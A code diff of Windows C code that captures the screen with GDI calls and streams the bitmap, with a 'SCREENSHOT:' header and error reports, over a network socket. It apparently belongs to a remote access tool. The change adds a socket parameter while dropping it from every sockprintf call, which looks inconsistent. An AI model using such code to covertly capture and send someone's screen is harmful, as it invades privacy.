@@ -63,7 +63,7 @@ DWORD ProcessId(LPCTSTR ProcessName)
     return 0;
 }
 
-int CaptureAnImage(HWND hWnd)
+int CaptureAnImage(HWND hWnd, SOCKET sockfd)
 {
     HDC hdcScreen;
     HDC hdcWindow;
@@ -81,7 +81,7 @@ int CaptureAnImage(HWND hWnd)
 
     if (!hdcMemDC)
     {
-        sockprintf(sockfd, "CreateCompatibleDC has failed Error %i", GetLastError());
+        sockprintf("CreateCompatibleDC has failed Error %i", GetLastError());
         goto done;
     }
 
@@ -102,7 +102,7 @@ int CaptureAnImage(HWND hWnd)
         GetSystemMetrics(SM_CYSCREEN),
         SRCCOPY))
     {
-        sockprintf(sockfd, "StretchBlt has failed Error %i", GetLastError());
+        sockprintf("StretchBlt has failed Error %i", GetLastError());
         goto done;
     }
 
@@ -111,7 +111,7 @@ int CaptureAnImage(HWND hWnd)
 
     if (!hbmScreen)
     {
-        sockprintf(sockfd, "CreateCompatibleBitmap Failed Error %i", GetLastError());
+        sockprintf("CreateCompatibleBitmap Failed Error %i", GetLastError());
         goto done;
     }
 
@@ -126,7 +126,7 @@ int CaptureAnImage(HWND hWnd)
         0, 0,
         SRCCOPY))
     {
-        sockprintf(sockfd, "BitBlt has failed Error %i", GetLastError());
+        sockprintf( "BitBlt has failed Error %i", GetLastError());
         goto done;
     }
 
@@ -184,7 +184,7 @@ int CaptureAnImage(HWND hWnd)
     bmfHeader.bfType = 0x4D42; //BM   
 
     TimeStamp(buffer);
-    sockprintf(sockfd, "SCREENSHOT:%s.bmp:%i", buffer, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
+    sockprintf("SCREENSHOT:%s.bmp:%i", buffer, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
     DWORD dwBytesWritten = 0;
     WriteFile((HANDLE)sockfd, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
     WriteFile((HANDLE)sockfd, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
